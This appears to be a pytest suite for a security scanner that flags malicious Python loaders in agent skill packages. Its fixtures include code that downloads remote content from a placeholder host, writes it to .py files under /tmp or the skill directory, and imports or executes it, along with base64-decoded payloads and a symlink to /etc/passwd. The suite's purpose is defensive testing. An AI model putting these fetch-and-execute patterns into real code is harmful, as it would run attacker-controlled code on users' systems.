    src = dedent('''
        import importlib.util, os

        def load(name):
            here = os.path.dirname(__file__)
            spec = importlib.util.spec_from_file_location(
                "setup_step", os.path.join(here, "setup_step.py")
            )
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    findings = _analyze(src, "run.py", root=str(skill_dir))
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)


def test_shipped_zip_is_unshipped_warn_present_unanalysed(tmp_path):
    src = dedent('''
        import zipimport, os
        z = zipimport.zipimporter(os.path.join(os.path.dirname(__file__), "bundle.zip"))
        z.load_module("bundle")
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    (skill_dir / "bundle.zip").write_bytes(b"PK\x03\x04")
    findings = _analyze(src, "run.py", root=str(skill_dir))
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)


def test_no_artifact_shipped_looking_literal_is_plain_info():
    """No artifact: T4 is skipped and a FILE-anchored literal target gets plain
    DANGEROUS_SINK info (the caller cannot say what the skill ships)."""
    src = dedent('''
        import runpy, os
        runpy.run_path(os.path.join(os.path.dirname(__file__), "setup_step.py"))
    ''')
    findings = _analyze(src, no_artifact=True)
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


def test_overwrite_shipped_module_then_run_path_is_staged_exec_not_info(tmp_path):
    """T1 (staged write) wins over T4 (shipped): overwriting a shipped module with
    remote content, then running it, is REMOTE_STAGED_EXEC crit -- not the plain info
    a load of an untouched shipped file gets."""
    src = dedent('''
        import runpy, os, urllib.request
        here = os.path.dirname(__file__)
        target = os.path.join(here, "helper.py")
        data = urllib.request.urlopen("https://example.invalid/p").read()
        with open(target, "wb") as f:
            f.write(data)
        runpy.run_path(target)
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    (skill_dir / "helper.py").write_text("def f():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "run.py", extra=[("helper.py", "def f():\n    pass\n")], root=str(skill_dir)
    )
    crit = {f.rule for f in findings if f.severity == "crit"}
    assert crit == {"REMOTE_STAGED_EXEC"}, findings


# ---------------------------------------------------------------------------
# Regression guards for round 1's OWN false positives -- a decoy same-scope
# binding feeding a loader/import site, in a file that merely IMPORTS a
# loader-sink module (or another everyday `_TAMPER_MODULES` entry), must stay at
# its ordinary crit verdict. Each one fails against f53a919b (round 1's
# `_file_tampers()`-in-`sole()` gate refuses these too, since
# `runpy`/`importlib`/`inspect` are themselves `_TAMPER_MODULES` entries).
#
# The B-922 `_operator.attrgetter`/`sys.settrace` frame-jump-plus-decoy-binding
# shape these guards once sat alongside (round 2's end-to-end pin, removed in
# round 3) is a real, still-open gap: neither the ungated resolution restored
# here nor round 2's refusal-based gate can both preserve recall on the files
# above AND close that shape -- refusing can only ever drop a conviction for
# this consumer (B-917's T1/T3 both require a real, non-SYM `Loc`), never
# preserve one at reduced confidence. Tracked as a follow-up for a "widen,
# never refuse" redesign, not another refusal-based gate.
# ---------------------------------------------------------------------------


def test_b996_round2_runpy_decoy_binding_without_frame_jump_primitive_stays_crit():
    """Regression shape 1: a decoy second same-scope binding on a `runpy.run_path()`
    target, in a file with no genuine frame-jump primitive -- the honest runtime
    value IS the decoy (last-wins is real Python semantics absent a trace hook), and
    the decoy sits in a world-writable dir, so this is a genuine T3 DANGEROUS_LOADER
    regardless."""
    src = dedent('''
        import runpy

        plugin = "/opt/skilldata/default.py"
        plugin = "/tmp/plugin.py"
        runpy.run_path(plugin)
    ''')
    findings = _analyze(src, "run.py")
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}, findings


@pytest.mark.parametrize("loader_call", [
    pytest.param('runpy.run_path(os.path.join(cache, "plugin.py"))\n', id="runpy"),
    pytest.param(
        'spec = importlib.util.spec_from_file_location('
        '"m", os.path.join(cache, "plugin.py"))\n'
        "mod = importlib.util.module_from_spec(spec)\n"
        "spec.loader.exec_module(mod)\n",
        id="importlib",
    ),
])
def test_b996_round2_accumulating_path_idiom_without_frame_jump_primitive_stays_crit(
    loader_call,
):
    """Regression shape 2: an accumulating-path idiom (`cache = ...; cache =
    os.path.join(cache, ...)`, itself a same-scope multi-binding rebind `sole()`
    must resolve) feeding a loader call, for BOTH loader forms -- `runpy.run_path`
    and `importlib`'s `spec_from_file_location`+`exec_module` -- with no genuine
    frame-jump primitive present. `tempfile.gettempdir()` anchors the final location
    under the world-writable temp dir: T3 DANGEROUS_LOADER either way."""
    src = (
        "import runpy, importlib.util, os, tempfile\n"
        "cache = tempfile.gettempdir()\n"
        'cache = os.path.join(cache, "myskill")\n'
    ) + loader_call
    findings = _analyze(src, "run.py")
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}, findings


def test_b996_round2_staged_import_rebound_path_with_unrelated_importlib_inspect_stays_crit():
    """Regression shape 3: a staged-import correlation (a tainted write, then
    `sys.path.insert`+`import`) whose shared directory is read through a same-scope
    REBOUND name, in a file that ALSO happens to `import importlib`/`import inspect`
    for something entirely unrelated to the loader/staged-import shape itself (those
    two imports alone tripped round 1's `_file_tampers()`-in-`sole()` gate via
    `_TAMPER_MODULES`, though nothing in this file actually reaches a frame-jump
    primitive). Must stay REMOTE_STAGED_IMPORT crit."""
    src = _src('''
        import sys, os, importlib, inspect

        _STAGE_DIR = "/opt/other"
        _STAGE_DIR = "/tmp/evilstage"
        open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)
        sys.path.insert(0, _STAGE_DIR)
        import mod
    ''')
    findings = _analyze(src, "run.py")
    assert any(
        f.rule == "REMOTE_STAGED_IMPORT" and f.severity == "crit" for f in findings
    ), findings


def test_case_02869_shaped_remote_plugin_loader_is_fail():
    """SkillTrustBench's MALICIOUS case_02869 shape verbatim (fetch -> temp file with
    an f-string name -> spec-load): FAIL via T1 (the shared temp-dir identity) with
    T3 (world-writable) as an independent second reason -- both must convict."""
    src = dedent('''
        import urllib.request, importlib.util, tempfile, os

        def load_remote_module(url, name="plugin"):
            data = urllib.request.urlopen(url, timeout=10).read()
            tmp = os.path.join(tempfile.gettempdir(), f"_{name}.py")
            with open(tmp, "wb") as f:
                f.write(data)
            spec = importlib.util.spec_from_file_location(name, tmp)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"REMOTE_STAGED_EXEC"}


def test_zipimporter_and_source_loader_class_forms_are_tmp_fail():
    src = dedent('''
        import zipimport
        from importlib.machinery import SourceFileLoader
        zipimport.zipimporter("/tmp/p.zip").load_module("p")
        SourceFileLoader("m", "/tmp/m.py").load_module()
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
    assert sum(1 for f in findings if f.rule == "DANGEROUS_LOADER") == 2


def test_imp_load_source_tmp_target_is_fail():
    src = 'import imp\nimp.load_source("m", "/tmp/m.py")\n'
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_two_hop_alias_to_spec_still_resolves():
    """`alias = spec; alias.loader.exec_module(...)` -- the multi-hop `sole()` chain
    `_b917_reaching_call` follows."""
    src = dedent('''
        import importlib.util
        spec = importlib.util.spec_from_file_location("m", "/tmp/m.py")
        alias = spec
        m = importlib.util.module_from_spec(spec)
        alias.loader.exec_module(m)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_same_named_spec_locals_in_two_functions_are_judged_independently(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    src = dedent('''
        import importlib.util, os

        def a():
            spec = importlib.util.spec_from_file_location("m", "/tmp/evil.py")
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)

        def b():
            here = os.path.dirname(__file__)
            spec = importlib.util.spec_from_file_location("h", os.path.join(here, "helper.py"))
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
    ''')
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    (skill_dir / "helper.py").write_text("def f():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "run.py", extra=[("helper.py", "def f():\n    pass\n")], root=str(skill_dir)
    )
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


# ---------------------------------------------------------------------------
# C. Staged import -- write/import location correlation
# ---------------------------------------------------------------------------


def _staged_import_verdict(src: str, root=None) -> str:
    findings = _analyze(src, root=root) if root else _analyze(src, no_artifact=True)
    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
    if any(f.rule == "REMOTE_STAGED_IMPORT" for f in hits):
        return "FAIL"
    if hits:
        return "WARN"
    return "none"


_REMOTE_WRITE = (
    'import urllib.request\n'
    'data = urllib.request.urlopen("https://example.invalid/p").read()\n'
)


def test_o3_ticket_verbatim_bare_urlopen_staged_import_is_fail():
    """B-927: the ticket's own third PoC, `from urllib.request import urlopen` (a
    bare name the old attribute-only remote-fetch check could not see)."""
    src = dedent('''
        import os
        from urllib.request import urlopen
        p = os.path.join(os.path.dirname(__file__), "v.py")
        open(p, "wb").write(urlopen("https://example.invalid/p").read())
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_o3b_qualified_urlopen_staged_import_is_fail():
    src = dedent('''
        import os, urllib.request
        p = os.path.join(os.path.dirname(__file__), "v.py")
        open(p, "wb").write(urllib.request.urlopen("https://example.invalid/p").read())
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_b979_o3_subdirectory_bare_urlopen_staged_import_is_fail():
    """B-979: the identical O3 source as test_o3_ticket_verbatim_bare_urlopen_
    staged_import_is_fail above, but the scanned file itself lives in a subdirectory
    (scripts/x.py) rather than at the artifact root. Before the fix, the same-file
    `search_dirs` base for this correlation was unconditionally
    `Loc("FILE", ())` -- the artifact ROOT -- instead of the file's own containing
    directory (`Loc("FILE", facts.relparts[:-1])`, the same pattern
    `_b917_import_sites` already used for relative imports). The write's own Loc IS
    the file's own directory (`os.path.dirname(__file__)` + "v.py"), so for a
    subdirectory file the candidate built from the wrong base (artifact root) never
    matched it and this finding was silently missed."""
    src = dedent('''
        import os
        from urllib.request import urlopen
        p = os.path.join(os.path.dirname(__file__), "v.py")
        open(p, "wb").write(urlopen("https://example.invalid/p").read())
        import v
    ''')
    findings = _analyze(src, "scripts/x.py")
    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in hits), findings


def test_b979_o3_differential_top_level_vs_subdirectory_both_convict():
    """O3 differential, pinned explicitly: the SAME source must convict whether the
    file sits at the artifact root or in a (possibly nested) subdirectory -- the
    file's own location must never change the verdict for a same-file write/import
    correlation."""
    src = dedent('''
        import os
        from urllib.request import urlopen
        p = os.path.join(os.path.dirname(__file__), "v.py")
        open(p, "wb").write(urlopen("https://example.invalid/p").read())
        import v
    ''')
    for filename in ("skill.py", "scripts/x.py", "a/b/c/deep.py"):
        findings = _analyze(src, filename)
        assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in findings), (filename, findings)


def test_b979_subdirectory_unrelated_tmp_write_and_import_is_no_finding():
    """Control for the fix above: a subdirectory file with a REAL remote write and a
    REAL absolute import, but to unrelated locations (a /tmp cache write, an
    unrelated top-level `helpers` import) must stay clean exactly like its
    top-level counterpart (test_r1a_own_import_plus_unrelated_tmp_cache_is_no_finding
    below) -- the corrected, narrower same-file base must not spuriously convict an
    unrelated write/import pair just because both now resolve under the file's own
    subdirectory."""
    src = _src('''
        import os
        open(os.path.join("/tmp/examples", "helpers.py"), "wb").write(data)
        from helpers import do_thing
    ''')
    findings = _analyze(src, "scripts/x.py")
    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
    assert not hits, findings


def test_b979_subdirectory_legitimate_script_with_no_staged_write_is_no_finding():
    """The clean-fixture shape B-979 asks for verbatim: a legitimate subdirectory
    script (scripts/helper.py) that imports a genuine sibling module and does NOT do
    the staged-write-then-import pattern at all -- must stay clean."""
    src = dedent('''
        from . import utils

        def run():
            return utils.do_thing()
    ''')
    findings = _analyze(src, "scripts/helper.py")
    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
    assert not hits, findings


def test_r1a_own_import_plus_unrelated_tmp_cache_is_no_finding():
    src = _src('''
        import os
        open(os.path.join("/tmp/examples", "helpers.py"), "wb").write(data)
        from helpers import do_thing
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r2d1_module_constant_tmp_dir_plus_syspath_insert_is_fail():
    """b917-design.md 2.1's own required case, verbatim: a MODULE-LEVEL constant
    `_STAGE_DIR` read by NAME from inside a function, where `locate()` needs the
    LEGB fallback to resolve it at all (`sole()` alone never falls back from a
    function scope to its enclosing module scope). Fix-round-1 regression test: the
    ORIGINAL version of this test used the literal `"/tmp/evilstage"` twice, in two
    independent scopes -- a literal resolves identically regardless of scope, so it
    passed without the fallback ever firing (review finding #1)."""
    src = _src('''
        import sys, os

        _STAGE_DIR = "/tmp/evilstage"

        def stage():
            open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)

        sys.path.insert(0, _STAGE_DIR)
        import mod
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_r2d1_module_constant_direct_literal_control_still_fails():
    """Control for the test above: the identical module constant used at MODULE
    scope with no function boundary at all (no LEGB needed) must give the same
    verdict -- confirming the fallback changes nothing about the no-function case."""
    src = _src('''
        import sys, os

        _STAGE_DIR = "/tmp/evilstage"
        open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)
        sys.path.insert(0, _STAGE_DIR)
        import mod
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_r2_control_same_write_no_syspath_mutation_is_no_finding():
    src = _src('''
        import os
        open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
        import mod
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r2d2_own_cache_dir_import_is_no_finding():
    src = _src('''
        import os
        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
        from helpers import do_thing
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r2dev_positive_matching_cwd_dir_is_fail():
    src = _src('''
        import sys, os
        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
        sys.path.insert(0, "cache_examples")
        import helpers
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_r2dev_control_unrelated_syspath_dir_is_no_finding():
    src = _src('''
        import sys, os
        sys.path.insert(0, "/tmp/other")
        open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
        import mod
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r3b1_split_and_combined_forms_are_no_finding():
    for expr in ('os.path.join("cache_examples", "helpers.py")', '"cache_examples/helpers.py"'):
        src = _src(f'''
            import os
            p = {expr}
            open(p, "wb").write(data)
            import helpers
        ''')
        assert _staged_import_verdict(src) == "none", expr


def test_r3b2_split_tmp_dir_plus_syspath_is_fail():
    for one_hop in (False, True):
        if one_hop:
            src = _src('''
                import sys, os
                stage_dir = os.path.join("/tmp", "evilstage")
                sys.path.insert(0, stage_dir)
                open(os.path.join(stage_dir, "mod.py"), "wb").write(data)
                import mod
            ''')
        else:
            src = _src('''
                import sys, os
                open(os.path.join("/tmp", "evilstage", "mod.py"), "wb").write(data)
                sys.path.insert(0, os.path.join("/tmp", "evilstage"))
                import mod
            ''')
        assert _staged_import_verdict(src) == "FAIL", one_hop


def test_r3_syspath_mutation_forms_all_resolve():
    forms = [
        'sys.path[:0] = ["/tmp/evilstage"]',
        'sys.path = ["/tmp/evilstage"] + sys.path',
        'site.addsitedir("/tmp/evilstage")',
    ]
    for form in forms:
        src = _src(f'''
            import sys, os, site
            open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
            {form}
            import mod
        ''')
        assert _staged_import_verdict(src) == "FAIL", form


def test_r3_aliased_import_forms_no_finding_without_syspath():
    for imp, use in [
        ("from os.path import join as j", 'j("cache_examples", "helpers.py")'),
        ("import os.path as p", 'p.join("cache_examples", "helpers.py")'),
    ]:
        src = _src(f'''
            {imp}
            open({use}, "wb").write(data)
            import helpers
        ''')
        assert _staged_import_verdict(src) == "none", imp


def test_r3_alias_direct_fail():
    src = _src('''
        import sys
        from os.path import join as j
        open(j("/tmp/evilstage", "mod.py"), "wb").write(data)
        sys.path.insert(0, j("/tmp", "evilstage"))
        import mod
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_bare_cwd_write_import_is_warn_not_fail():
    """Deliberate change from the retracted branch (which pinned this crit): CWD and
    the running script's own directory are the same thing only sometimes -- WARN."""
    src = _src('''
        open("v.py", "wb").write(data)
        import v
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_package_init_chain_executes_on_submodule_import():
    src = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "pkg", "__init__.py"), "wb").write(data)
        import pkg.sub
    ''')
    assert _staged_import_verdict(src) == "FAIL"
    src2 = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "pkg", "mod.py"), "wb").write(data)
        from pkg import mod
    ''')
    assert _staged_import_verdict(src2) == "FAIL"


def test_relative_import_forms():
    src = _src('''
        import os
        open(os.path.join(os.path.dirname(__file__), "v.py"), "wb").write(data)
        from . import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_dynamic_import_forms_literal_name():
    for call in ('importlib.import_module("v")', '__import__("v")', 'runpy.run_module("v")'):
        src = _src(f'''
            import os, importlib, runpy
            open(os.path.join(os.path.dirname(__file__), "v.py"), "wb").write(data)
            {call}
        ''')
        assert _staged_import_verdict(src) == "FAIL", call


def test_dynamic_import_non_literal_is_warn_when_a_py_write_exists():
    src = _src('''
        import os, importlib
        open(os.path.join(os.path.dirname(__file__), "plugin.py"), "wb").write(data)
        mod_name = compute_name()
        importlib.import_module(mod_name)
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_b980c_wildcard_branch_computed_py_write_now_warns():
    """CLAWSECCHECK-B-980(c): the same shape as
    test_dynamic_import_non_literal_is_warn_when_a_py_write_exists above, but the
    write's final path segment is COMPUTED (`name + ".py"`) rather than a literal
    ".py" name. Before the fix the wildcard branch's `tainted_py_write` only looked
    at `Loc.leaf_py` (true only for a literal final segment), so this shape --
    already recognised elsewhere via `Loc.tail == "module"` -- was invisible here
    and produced no finding at all."""
    src = _src('''
        import os, importlib
        here = os.path.dirname(__file__)
        name = compute_name()
        open(os.path.join(here, name + ".py"), "wb").write(data)
        mod_name = compute_name()
        importlib.import_module(mod_name)
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_b980c_wildcard_branch_untainted_computed_py_write_stays_clean():
    """Clean control for the fix above: the identical computed-.py-write shape, but
    the write's content is ordinary local data, not remote/decoded --
    `tainted_py_write` still requires `w_tainted`, so this stays clean exactly as it
    did before the fix."""
    src = dedent('''
        import os, importlib
        here = os.path.dirname(__file__)
        name = compute_name()
        open(os.path.join(here, name + ".py"), "wb").write(b"local content")
        mod_name = compute_name()
        importlib.import_module(mod_name)
    ''')
    assert _staged_import_verdict(src) == "none"


def test_mkdtemp_same_binding_is_fail_two_calls_is_warn():
    src_same = _src('''
        import sys, os, tempfile
        d = tempfile.mkdtemp()
        open(os.path.join(d, "mod.py"), "wb").write(data)
        sys.path.insert(0, d)
        import mod
    ''')
    assert _staged_import_verdict(src_same) == "FAIL"
    src_diff = _src('''
        import sys, os, tempfile
        d1 = tempfile.mkdtemp()
        d2 = tempfile.mkdtemp()
        open(os.path.join(d1, "mod.py"), "wb").write(data)
        sys.path.insert(0, d2)
        import mod
    ''')
    assert _staged_import_verdict(src_diff) == "WARN"


def test_b752_anchor_swallow_absolute_join_segment():
    src_no_syspath = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "x", "/tmp/q/v.py"), "wb").write(data)
        import v
    ''')
    assert _staged_import_verdict(src_no_syspath) == "none"
    src_with_syspath = _src('''
        import sys, os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "x", "/tmp/q/v.py"), "wb").write(data)
        sys.path.insert(0, "/tmp/q")
        import v
    ''')
    assert _staged_import_verdict(src_with_syspath) == "FAIL"


def test_chdir_makes_cwd_pair_undetermined():
    src = _src('''
        import os, sys
        os.chdir("/tmp/e")
        open("mod.py", "wb").write(data)
        sys.path.insert(0, "/tmp/e")
        import mod
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_symlink_present_makes_a_definite_not_pair_undetermined():
    src = _src('''
        import os, sys
        os.symlink("/etc/passwd", "/tmp/link")
        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
        import helpers
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_decode_staged_write_then_import_is_fail():
    src = dedent('''
        import os, base64
        B = base64.b64encode(b"print(1)")
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "w").write(base64.b64decode(B).decode())
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_urlretrieve_then_import_is_fail():
    src = dedent('''
        import os
        from urllib.request import urlretrieve
        here = os.path.dirname(__file__)
        urlretrieve("https://example.invalid/p", os.path.join(here, "v.py"))
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_benign_local_literal_write_is_no_finding():
    src = dedent('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "wb").write(b"static content")
        import v
    ''')
    assert _staged_import_verdict(src) == "none"


def test_benign_file_read_content_is_no_finding():
    """File-read content is not a staged-write source (design section D)."""
    src = dedent('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "gen.py"), "w").write(open("tpl.txt").read())
        import gen
    ''')
    assert _staged_import_verdict(src) == "none"


def test_streaming_download_then_import_is_fail():
    src = dedent('''
        import os, requests
        here = os.path.dirname(__file__)
        r = requests.get("https://example.invalid/p", stream=True)
        with open(os.path.join(here, "v.py"), "wb") as f:
            for chunk in r.iter_content():
                f.write(chunk)
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_unparsable_file_still_yields_unanalyzable():
    findings = analyze_python("def f(:\n", "bad.py")
    assert findings and findings[0].rule == "AST_UNANALYZABLE"


# ---------------------------------------------------------------------------
# E. Wiring -- vet routing end to end (a FAIL rule really fails --vet; a WARN rule
# never does), and the B-636 never-fail registry covers both new rules (also pinned
# mechanically by tests/test_b636_plugin_python_reader.py).
# ---------------------------------------------------------------------------

_SKILL_MD = "---\nname: demo\ndescription: x\n---\n# demo\n"


def test_vet_fails_on_tmp_loader_target(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "run.py").write_text(
        'import runpy\nrunpy.run_path("/tmp/stage2.py")\n', encoding="utf-8"
    )
    result = vet_skill(skill_dir)
    assert result.status == "FAIL", result.detail


def test_vet_does_not_fail_on_unverified_loader_target(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "run.py").write_text(
        dedent('''
            import runpy, os
            def load(path):
                runpy.run_path(path)
        '''),
        encoding="utf-8",
    )
    result = vet_skill(skill_dir)
    assert result.status != "FAIL", result.detail


def test_never_fail_rules_includes_both_new_b917_rules():
    from clawseccheck.checks._vet import _AST_NEVER_FAIL_RULES
    assert {"LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED"} <= _AST_NEVER_FAIL_RULES
    assert "DANGEROUS_LOADER" not in _AST_NEVER_FAIL_RULES
    assert "REMOTE_STAGED_IMPORT" not in _AST_NEVER_FAIL_RULES


# ---------------------------------------------------------------------------
# F. Fix round 1, review finding #2 -- b917-design.md 2.3's ARTIFACT-WIDE staged-
# write cache: row 35, a write in one file of a skill correlating with an import in
# another. Before this fix, correlation was scoped to one file at a time, so this
# exact ticket-chartered shape (O3 split across updater.py/main.py) gave zero B-917
# findings on either file and a full end-to-end vet_skill PASS.
# ---------------------------------------------------------------------------


def test_cross_file_staged_write_correlates_with_import_in_sibling_file(tmp_path):
    """Row 35: `updater.py` writes remote bytes to `join(HERE, "v.py")`; `main.py` in
    the same directory does `import v`. Scanning main.py alone finds nothing to
    correlate against -- only the artifact-wide cache built from EVERY file of the
    skill catches it, exactly as it would if both statements were one file."""
    updater_src = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "wb").write(data)
    ''')
    main_src = "import v\n"

    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "updater.py").write_text(updater_src, encoding="utf-8")
    (skill_dir / "main.py").write_text(main_src, encoding="utf-8")

    findings = _analyze(
        main_src, "main.py",
        extra=[("updater.py", updater_src)],
        root=str(skill_dir),
    )
    assert any(
        f.rule == "REMOTE_STAGED_IMPORT" and f.severity == "crit" for f in findings
    ), findings

    result = vet_skill(skill_dir)
    assert result.status == "FAIL", result.detail


def test_cross_file_correlation_needs_an_artifact_not_just_two_files():
    """The identical write/import pair, each file analysed ALONE with no artifact:
    b917-design.md 2.3's own words for row 35, 'without an artifact: none for either
    file taken alone' -- neither file has enough evidence by itself, so a cache that
    somehow persisted across UNRELATED calls (rather than being keyed on one
    `ShippedArtifact` instance) would be the leak the design's Risks section warns
    against, not a fix."""
    updater_src = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "wb").write(data)
    ''')
    main_src = "import v\n"
    assert _staged_import_verdict(updater_src) == "none"
    assert _staged_import_verdict(main_src) == "none"


def test_artifact_staged_write_cache_does_not_leak_across_artifacts():
    """Two DIFFERENT `ShippedArtifact` instances, built one after another, whose
    `main.py` files are byte-identical `import v` -- only the one whose OWN sibling
    ships the staged write may FAIL; the other must not inherit it through the
    module-level cache (b917-design.md's Risks section: 'must ... never leak across
    artifacts')."""
    updater_src = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "wb").write(data)
    ''')
    main_src = "import v\n"

    tainted = _analyze(main_src, "main.py", extra=[("updater.py", updater_src)])
    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in tainted)

    clean = _analyze(main_src, "main.py", extra=[("updater.py", "def f():\n    pass\n")])
    assert not any(f.rule in _CRIT_RULES for f in clean), clean


def test_cross_file_correlation_is_order_independent():
    """The write-file and the import-file may be visited in either order -- the
    cache is built once from the WHOLE artifact, not accumulated file-by-file in
    scan order."""
    updater_src = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "wb").write(data)
    ''')
    main_src = "import v\n"
    art = se.ShippedArtifact([("updater.py", updater_src), ("main.py", main_src)])

    updater_first = analyze_python(updater_src, "updater.py", artifact=art)
    main_after = analyze_python(main_src, "main.py", artifact=art)
    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in main_after)

    art2 = se.ShippedArtifact([("updater.py", updater_src), ("main.py", main_src)])
    main_first = analyze_python(main_src, "main.py", artifact=art2)
    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in main_first)
    assert [(f.rule, f.severity) for f in main_after] == [
        (f.rule, f.severity) for f in main_first
    ]
    assert not [f for f in updater_first if f.rule == "REMOTE_STAGED_IMPORT"]


# ---------------------------------------------------------------------------
# G. Fix round 2, review finding #1 (BLOCKER, introduced by fix round 1) -- a
# module-level path constant used by one function for a genuine remote-fetch-then-
# write, and a SEPARATE function whose own PARAMETER happens to share that exact
# name, gave REMOTE_STAGED_IMPORT crit / vet FAIL as if the parameter were
# definitely bound to the staged write's target. Root cause: the LEGB fallback
# (fix round 1, b917-design.md 2.1) treated "sole() could not resolve this name in
# the immediate scope" as "the name is free here, walk outward", when it also means
# "the name IS bound here through a parameter/for/with/comprehension/except-
# as/nested-def/import -- and that binding must stop the walk, resolvable or not.
# See Section A above for the unit-level `locate()` pins; these are the same defect
# reproduced end to end through `_staged_import_verdict` and `vet_skill`.
# ---------------------------------------------------------------------------

_B917_FIX2_SHADOW_SRC = dedent('''
    import os
    import sys
    import urllib.request

    CACHE_DIR = "/tmp/appcache"

    def sync_something():
        """Benign-shaped: refresh a local cache file (module-level CACHE_DIR).
        This IS a real staged write for B-917 purposes -- that's fine, it's a
        distractor for the actual attack below, not the thing under test."""
        data = urllib.request.urlopen("https://example.invalid/user_plugin.py").read()
        with open(os.path.join(CACHE_DIR, "user_plugin.py"), "wb") as f:
            f.write(data)

    def load_plugin(CACHE_DIR):
        """CACHE_DIR here is a PARAMETER -- e.g. a caller-supplied, user-approved
        plugin directory. It shadows the module-level CACHE_DIR and has NOTHING to
        do with it at runtime."""
        sys.path.insert(0, CACHE_DIR)
        import user_plugin  # noqa: E402
        return user_plugin
''')

_B917_FIX2_CONTROL_SRC = _B917_FIX2_SHADOW_SRC.replace(
    "def load_plugin(CACHE_DIR):", "def load_plugin(plugin_dir):"
